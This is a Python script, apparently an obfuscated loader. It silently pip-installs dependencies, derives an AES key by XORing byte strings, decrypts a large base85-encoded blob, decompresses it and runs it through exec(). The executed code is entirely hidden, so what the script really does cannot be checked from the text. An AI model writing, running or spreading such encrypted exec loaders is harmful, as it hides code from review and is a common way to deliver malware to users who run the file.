
import sys, base64, zlib, subprocess

def _req_check(p, m=None):
    if m is None: m = p
    try:
        __import__(m)
    except ImportError:
        print(f"[*] Installing dependency: {p}...")
        subprocess.check_call([sys.executable, "-m", "pip", "install", p, "--quiet"])

# ติดตั้งตัวถอดรหัสก่อน
_req_check("pycryptodome", "Crypto")

# ติดตั้ง Module ที่แสกนเจอจากโค้ดของคุณ
_needed = ['subprocess', 'ujson', 'asyncio', 'httpx', 'os', 'rich', 'datetime']
for mod in _needed:
    _req_check(mod)

from Crypto.Cipher import AES
from Crypto.Util.Padding import unpad

def _xor(p):
    from functools import reduce
    return reduce(lambda a,b: bytes(x^y for x,y in zip(a,b)), p)

_K = _xor([b'\xd9Y\xa4\xf7\xd5\xd8\xd3\xdf[\x99\xfeM.C\xd9\x9a\x04\xdb\xc2:R\xcfkg]\xe5.\xd9\x97\x19\xf0\xf8', b'\xa1\xbc8j$0\xbb\xf3=\x8d\xc5\xbfu\xc8:\xf16H\x9cn\xcfN\x187\xd4Vp=\xd1XN3', b'\xfa\xebO\x9e\xb4g\xff\xf8e\x99\x93\xda\xef\xdd\x12\x08!\xd3urcwd\xc7ZFv\xbbC\x14K\xd6'])
_I = _xor([b'9<\x01S^\xb9\xe2\x97I\x98\x87\xe5\xdf\xa3\xa3\xe0', b'\x8eF\xf3\xa1\xcbu9\x81\x9d\xc6\x9b\xd9\xacg\x9fK'])

def _decrypt_str(d):
    iv, p = d[:16], d[16:]
    return unpad(AES.new(_K, AES.MODE_CBC, iv).decrypt(p), 16).decode("utf-8", "ignore")

def _decrypt_bytes(d):
    iv, p = d[:16], d[16:]
    return unpad(AES.new(_K, AES.MODE_CBC, iv).decrypt(p), 16)

_enc = base64.b85decode('Ww1lkkLaDCg1tOMRQ$a&f~f7#ph+Qi1fWh`xL`V%Cn;N<RefD9^IvQfq`Vve3JoBWyR2ig>bG!uz<S2(cDHQ@#~dSGHE?_bmf<APpMi8|L0_@y(VZ@>=Qn%p={ccU`w1t#ZHDrFWJxbBi`zA?$8ZPskt}v1ZFd7E<L=c7CvOjuY7`S@N1mDW!k_7<?mM2zA2epx>z=8zWX-+G<Hf@S1iZE)LdlU8S6ISe3$EcV4$Ip^P(#%~m;)0&EHq*-%THqozI^;B^X@OZePTQ-9pB2Yh}|*$2BfK4P%ecEl*ATw7*>w@g9D08uKCw8j$`vMg<D-ONePAB#-9Z$KlfMS7JKEkGF=avSDYAJexvyxsBmp1URAgms|R%ms<tVG;{EA)teSvY6a@a{t?Gm^q0a$k#b>muG=rFXtL{zB)eoTjI2l_uU!!kX=H+NNLAPc`<ClU(b!OGIz!qaZvO<1WMv!g8<t`V*wxsLT9g6(QdRi!c&ibSQP+{QcwrY{&5l2j3*5LO6>}?`eMaN~rscdR5@Z~pNo#r|82-meLeC7bB#?8C!2zh{wr^6r47P{h?XiyQXvXs<HlO|yc+OLW_?@^^N0?NO@plmfFe>d2y!eCo=tT_0rpI$`lpen#gD`iW9E1=KAW=Z|_Mw=W8ueuywo6+QHg6r$nb9bRDWWLwXu;&Qh9*V9YkIU4?5|+GW=h^LaAb`O*tZ{QU;igei;)5^AT;wH^mw;A{HINUw2ws4Zj>-X&KOxV|-&YlR_}9g&4s&|la%><W*=5tsd56W3Qt3WB>_{_-e#$8Fq4U`ow6LO~-es}{9a&@*Se`Uegx0b?s|XUkuI#EVRd<9l3ui$MYKl?=lt94ipdE+f4nJb10$(<(s9316WZiW+I0A=C-94@}Hx}=-{dr}CHvV}=pYt5UpUML3gYu_9ekg4ryn}`_x@4<@JN;4Dg@T#o*V*F=zEXM-AjVQK|G1-X>^+<t%$v;jJu{RIHF4m>S(_8h07G>818p4(^){G7agY==NRe#VN%!kIhktaTZhbJ#l+L@hFrD~}hHiIuO;I*M*=m8au%tupezxeCw5+UaC4!EJf;!$nS6hV|@NygjH1FvnAm`h}bYdW3=@jcElS=we4i0X#7Y|QY?cHCFe%8`n$a)n)KwHE$VgZ{<5TKIrv4dIqw9p-Z_arRENl~&K8vx^DeCKje6+UTzk0ViZe?+`#z}S=Jri5SUQl;V4R0`Gr^m=^G7v)uxhN4?aX+I&46$FQ1R5{^O@llay!`A?i;I^sAw>^7)R`je$Ktf(Q$t_z8iT_mPhZ5ycVsF|&)!oBkWXA9x0Bqs~c(>PU&qDc37k1JoGjmNnvp)o&lAARRJS+A_z0h-RLLdo68eno`fru#r-nAW^vEsx%>v&>Tt)myb$Xqa_D|(R}WsiwOJo_!V3k5IbN##jg+Wx((j1?V*{tq_b3D><x<#`Y+{!l9dc>%LW;Y)*S5IAp`WYj-eVC<=YKrCfHod4#UjuOvyp3tesuBEcu?g1YiPD;}Z04Y~MnJ^+qs@_rZdg)ba%1Y*$bqA{kU(==$RBlmTeFa~B38G2qdnA;1WiE`>WA?khFGX*Qd6EWml*nRDyK9ItRAw090MG44pkjl$(gJ`@;Gmn+_Cf~c2=4>c$(QoU`WR><qz;pp9dDRgu9*~QtLS9H^>VJnbNO?U!^+*`iM!AC5(_s|OK6}`Rf!jb>8R7Dpbbi>c&?A~aw(OhsTa<=xw~SH6uUbB(H^5hf*9W3<+2Vt+~Bdh)ZP!LhWGkBIu`bQM?$}i#RGkInNbae|BQ3wU4JWgsq*2!<nZ+hm$YW;Ti1}VC6_#2>qx3Ek}7p~KD8fuU#y!Q%Bv+2!yVGKW3P%I;MAo*?Cm2VMgdN$FG0=PfoXM1SBgE&gUBLd5s|G-IOBqmDXi1nVjv4f%t{UfBm#IDN1U}PJq$8A)&R%(dw!y%qMb}}X$in;h1?&(Yq2(b`2IauHRpo$0Cf>dn*d>TI6ECT@@{15U<HVhr0EbP24@lN!nr<gBUs_70wj}dE7p|VWX62&tw28P!{8+g4hM8vC*88kkjw$Iqbf|uTZP6cEO9R2{Zn<|7Ur4hq3v;K6^Ktg`%E2hNL?sM`Mg!0vUFaSNF^#K$NX?!ipoP~Mapx0!8?OIm8}{3cx4jhw5(~7R$B}0t7k@FCQ<$OgEdm*MaqI?YHLC7FNSC~f%&K?4Ws76oih!`A-FWbc!xi@h{>9R5~!1DY|Bw}Q3Z22^F`J0X>;Q8#@ySy@Teu@^MMl{{KLPXH9g=%CD<D!M`lV=cyvgWU<$Bp^JpDZo+7#S`Ql_}0y!}8gr4rs*qXC&wcuL*&yPpXg(vm~q&|NsD&}ZG3OX*cA*Jey35RK0N^P1X+CA!Xq(>bfHQdL*{PYT^9vQOPOsR#b7DkNWr$;R)>ju;e#PV+Yq;yjpyT%L0?NitTKvRAf9FK82F&o-g=Wkv;af$4|N1B{j$8GerMXIBn{sNEiL1V8t5MCh*mVEyGGGM?W+kf#&8=VwP{QZe;V-RuBW;o-HdN3N)9T8CHt|~ZKt{+B`LSbdR){~U0Vv)MXS=5nmYM}1Muh%MM-l4C`;V#XEWijch75u>+?Nj{zVu(PKK9e$*7xsE8<TNYfj_!epc5V1ID~a*TWK4hE!DP&MS364(Js+?ZgUd@E?>3jDJh#Z@cOwcxy%^CDy!d{#862TQy?r6v9Nx{X2oh;@bFFy`R=F$^FvLMo_1R%p=mp-SBFDhEMD5`>5cy1;J$bdh4a1GyG*Jf=510)0J+-k`2FLr!3qi*|OgtdNVGqK-vD<Qr-Vszr0Z-|N8Z#+kx7P#x=YGv*?b-WFcG8Bn*zfh)wgj~vg>vrrqE<~13A{f~++p16(|-8KobVtFgXV&b+Bzqe4u=Cm^ihTlL%bmIvv^xyn>Lo;kP>&(Ujx2zwRl2>Tm_67E(GzcF5tC-I1zCGEhCqE|8CS?*D=>wP*q6`)(%EFw_(;K3zD7nCo|bIaHk4wyt^2iYq~Go3IC7D$qaQO{UU9Y7(MU$bxa7GeV=Kr@uDaaOFOwXjFCf)4&<9Kz}Ffqg(l=qPXm%f0}sWP@Ss$iAx7jofz{>62%Q$&J1R-z$ZY;K#L_9>D{uuzo$C7aqb?zV;$4FC54-hO5<H|1L&i5W&F15lVlWv<_yKGzN7Y2>w{A*h7pC-gJDUlz1FgFt1=Ji{eAWM?Y*FD6sGz#g27U|g{iKC!q|G5Y;+HDKFmWW<FUk$K=sK4xkos-TTDQ&)$eZUUV21P2j6C@@oKa3iJGhTu%5FJmjZ2o``pu{c0?|zTQVe%PgtJFlVf@CUjz%>EVUxa-2teFUqoRMl>xc1WEnI)ZHg^K`z|9T$(_uj{;m|9PYMb<SsUA_=DP%VY*fV_GN?nb_^i->+bV9?lB*$9<({?8f)7q+n|EG?xj`?ACI$P4XLYy$!P479wm7VXjuh6Wi?%0zd9%tnR;!Qp%A^c$O$Opuz1^O@K8aj*0&bU*a`X+8H9TDYo$kOcZ8|+oApnT^K_=Z2{bpk;6&WUVlTLK6Qi-?<zioq!K>~Teyu&ym_MCP5$K0a(TWLkw}&zh`%GU}3}ryW)VK1JVByUx3vp$H+utPw;_!L&+c^k{%?Du5%3D<HnSuGO9czRo(ROTQyMtgB`SPp3O6wgovY3~xpOZghmOigz#Tr2p2RDhIhNK8Ek*ZUer3kt298hRA+>2xNSm5v@r11iG{JBYT<|Q<j}NP1vl@BYOiJQPRoAAP8!kxy)9R;;PVfhgspuK&{7c60YAHGqV^|H3w0)ZPxaUr40nHG)#)M-BG9Kl(#*z8UtvhA{lkI(3PfG{B}YVX2PNTB5w1!;@!!bCHtX#4hq%}&qnn>B}QlFQR4H#O;SJOXiY}of#U=x-bT#7%LEvn8@ss|OVZZaLH4(%0b9b6p;8u@6)i++yr0l%FLB_D0AUXF%Cn9C(f8g+6f64KFoDsgYrLsD)0bx9(n_UgfeIUPe$Dw=l(p^TMArBVye@@(xhQ;lQXn36jh5m_gp!Dhrpg%A7j(MX|6g|)aVd8xyFL+5e$)mZ;-hNws;jt&u14rd%@DT*JYQtOj8C&?-`l#52;|k<N~n$9bZ>Mxr)m4XJpO-O^l?mWCml5k1mf8d;pu)5cmGdC7#6ZO7BZyM^eZWI%!Lig2v0>(5|kqZwH%y^@RRMed~ycT7X)qIXioIbbN(i#DoVC)(UZhsP<(ltg%q4?^7_)xwnPI&1J^ibZ{;y|U0)-_{#en@AplK`uvqo#5rZJ-^CDl$>uvFD=({FN7eb>h)lz$(HS7xA&;e8lxO$uqaeE>sZ&clnVz={N^=TzaZJ`<OYfD%AJ<}_#OFcYwdaPPh>1Mai|26Ge7m*xn3tOM_@{4f3?E-6ApOfF0p576t`{OZHIzNd-=#G)9f#mTX&xL7nkA(VIJRFK(3aP~s%{~KrG2dbmD|jHMSTG~&le0v2?7Q(b<6|u`;wyWLc58Y^S07tLH^ztY9+qGJa?x9;XAn-Aud|lkD_EHScx_Gkgi@=_O9C1LRqpV_v~pDmjV)Wvor7xBV9<?MNVk-+Pni4dJrW;9(Ay*2xN|`WpaavI{vV7W_z|0-01-QYoeXhr$D{Bu+qBk8$}M|vMg~z0M~KQ+EW3IRc!-6S;o%W&97mFsb&}Q$Op`~e@NYtP)}CrMA1lpjJnaq8<91-d<0oX&X6kN)bgH#Y0|Pbls8$LnryB-m8UjuYfiEAd?Eb3-qqWO?Vd0-B?S}h0dre$tOpA_x&;XWDUI0>)*MDuuV&G?9YB(x&Ss$mtNjQ^UheNnw61QrEaGFqD!%ACKa20C|W$xQ6u+hF$sxuyEg0mGG8jF3BN7W@QVeK=2Z3ix=a%_b!l@;L2^NO*fNhG!wCg#p|c$L(u%Vf2IgyQAI_5vk~0)Ef@+Eyp3zg72NRo{OJ3r3@TEeQaq4s$tq5k7_34AjYj1|aFRHZNMzr=+pMMPSa?wx|<XhTD&GSihWoMlgmnO7a+15ly1{iY~Pb#>{{O4!y%6Tqg*CyQB8m>2xJ42<E+7pvH+y-c3oK&d&20{K?5ou@1)sS<2l=8H~A%v)NiZUdJm{*+7#JM+e%Nl=++t)!P3Rc*;fT&WgjUThm)5#Ja0N2q+2(JlVBP{u1|;E#Ps@ZQTiO!)Sz>%ml_o(+sFxe%5|>n2XUNST@7j383|L&s3arBL$N77F9fNVJc7s8*NK0a32wFJMB-qg(bakgOa4~P2Qs?nYsm_qVet^5L@rw53DXTn|@X8tZDexUvvG-i}k1<<s2+J8P8UyJw;NY4*@wv&}~%MF`*<Q3#eQZlGHqsbrOdSNhoeP^@SXV9RB;1f(khYJcI>|S1?lWi0d%p6|#=CV=QEon*g<S&;r8oTlWiuik!?WSBHZcSg1r!Rq6d#jp=lN*pAASDV$0ZLUpdHt=7im&>9&3u2VZA6({oC=NyPGtmtm1!}HMv9V+-+G88P!`^0Jbv6lAk74YwL)!>S{&9?OaG+;M~`7v=FO*O+g&w|vU$=$qEEHP3U-462sJrypDxRFM(5HwQ0RcyaaOv@ADeEIw*3-CgL_I7^Cp_Q73p85w{$==SMvV<W>{VL7`$6gm%`l@P{*h+f|JtJ}7<Km=)tt?oeBt$0YVX>&6qyiUhhnDsnH)E6=75~g0jCz6UzTDwA1mq1V-QA0uqy0p6qa$TVOPQQ9j33Q)R>8!XZemt`oGp$4@XRlt)e?iikzl;IbYFP}YTiVQ%;E(*_?Q7viO;mDJz0^mxaVFa>_vtC9?bR=o0%ZIpig8)Pi~ykay4+1YSo3)XvT<zB7y*j+^;pG(GiW8Vbz;Vs<X@L=uR685*SrG*h#0H2+bTCktIVOm5TX^a<0uCS>Vi?lbg~%<{AsC@u#K)QGkDR')
_raw = unpad(AES.new(_K, AES.MODE_CBC, _I).decrypt(_enc), 16)

# EXECUTE UNIVERSAL CODE
exec(zlib.decompress(_raw).decode('utf-8'), {
    "__name__": "__main__",
    "__builtins__": __builtins__,
    "_decrypt_str": _decrypt_str,
    "_decrypt_bytes": _decrypt_bytes,
})
